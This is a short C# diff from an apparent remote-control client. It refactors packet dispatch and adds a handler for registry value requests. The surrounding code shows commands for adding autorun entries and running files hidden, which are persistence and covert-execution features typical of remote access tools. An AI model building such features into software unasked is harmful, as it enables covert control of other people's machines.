@@ -60,6 +60,7 @@ namespace RemoteControl.Client
         {
             handlers.Add(ePacketType.PACKET_VIEW_REGISTRY_KEY_REQUEST, new RequestViewRegistryKeyHandler());
             handlers.Add(ePacketType.PACKET_ADD_AUTORUN_REQUEST, new RequestAddAutoRunHandler());
+            handlers.Add(ePacketType.PACKET_OPE_REGISTRY_VALUE_NAME_REQUEST, new RequestOpeRegistryValueNameHandler());
         }
 
         static void ReadParameters()
@@ -659,13 +660,12 @@ namespace RemoteControl.Client
                 var req = obj as RequestOpenFile;
                 ProcessUtil.Run(req.FilePath, "", req.IsHide, true);
             }
-            else if (packetType == ePacketType.PACKET_VIEW_REGISTRY_KEY_REQUEST)
+            else
             {
-                handlers[packetType].Handle(session, obj);
-            }
-            else if (packetType == ePacketType.PACKET_ADD_AUTORUN_REQUEST)
-            {
-                handlers[packetType].Handle(session, obj);
+                if(handlers.ContainsKey(packetType))
+                {
+                    handlers[packetType].Handle(session, obj);
+                }
             }
         }
 
